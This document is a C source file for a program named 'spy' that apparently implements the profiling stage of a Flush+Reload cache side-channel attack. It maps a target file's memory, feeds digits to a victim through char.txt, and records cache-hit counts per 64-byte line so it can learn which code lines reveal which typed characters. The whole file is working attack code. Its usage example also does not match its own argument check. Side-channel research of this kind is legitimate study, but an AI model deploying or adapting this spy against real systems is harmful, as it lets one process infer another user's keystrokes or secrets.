#include <unistd.h>
#include <pthread.h>
#include <fcntl.h>
#include <stdio.h>
#include <string.h>
#include <signal.h>
#include <stdlib.h>
#include <sched.h>
#include <sys/mman.h>
#include <stdint.h>
#include "../cacheutils.h"

// this number varies on different systems
size_t DURATION =  200;

size_t flushandreload(void* addr, size_t min_cache_miss_cycles)
{
  size_t count = 0;
  size_t time = 0;
  size_t delta = 0;
  size_t end = rdtsc() + DURATION * 1000*1000;
  while(time < end)
  {
    time = rdtsc();
    maccess(addr);
    delta = rdtsc() - time;
    flush(addr);
    if (delta < min_cache_miss_cycles)
    {
      count++;
    }
    for (int i = 0; i < 25; ++i)
      sched_yield();
  }
  return count;
}


int main(int argc, char** argv)
{
   //check input
  if (argc != 5)
    exit(!fprintf(stderr,"  usage: ./spy <min cache miss cycles> <addressrange> <offset> <filename>\n"
                 "example: ./spy 200 155 400000-489000 0 char.txt\n"));
  size_t min_cache_miss_cycles = 0;
  if (!sscanf(argv[1],"%lu",&min_cache_miss_cycles))
    exit(!printf("min cache miss cycles error\n"));
  unsigned char* start = 0;
  unsigned char* end = 0;
  if (!sscanf(argv[2],"%p-%p",&start,&end))
    exit(!printf("address range error\n"));
  size_t range = end - start;
  size_t offset = 0;
  if (!sscanf(argv[3],"%lx",&offset))
    exit(!printf("offset error\n"));
  char filename[4096];
  if (!sscanf(argv[4],"%s",filename))
    exit(!fprintf(stderr,"filename error\n"));
  fprintf(stderr,"filename: %80s, offset: %8lx, duration:  %luus, probes: %10lu\n",filename,offset,DURATION,range/64);
  int fd = open(filename,O_RDONLY); 

  //map the files to the running program's virtual memory. Does not actually read the contents of the files
  start = ((unsigned char*)mmap(0, range, PROT_READ, MAP_SHARED, fd, offset & ~0xFFFUL)) + (offset & 0xFFFUL); 
  FILE *fp;
  FILE *fpo;
  char* chars = "1234567890";
  size_t chars_len = strlen(chars);
  size_t count = 0;
  fpo = fopen("profile.txt", "w");
  for (size_t i = 0; i < range; i += 64)
  {
   fprintf(fpo, "%lu,", i);
   for (int j = 0; j < chars_len; j++)
   {
     fp = fopen("char.txt", "w");
     fprintf(fp, "%c", chars[j]);
     fclose(fp);
     for (size_t k = 0; k < 5; ++k)
       sched_yield(); 
     flush(start + i); 
     for (size_t k = 0; k < 5; ++k)
       sched_yield(); 
     count = flushandreload(start + i, min_cache_miss_cycles);
     fprintf(fpo, "%c=%ld,",chars[j],count);
    }
    fprintf(fpo,"\n");
 }
  munmap(start,range); //release memory
  close(fd); //close the file
  fclose(fpo);
  return 0; //return
}

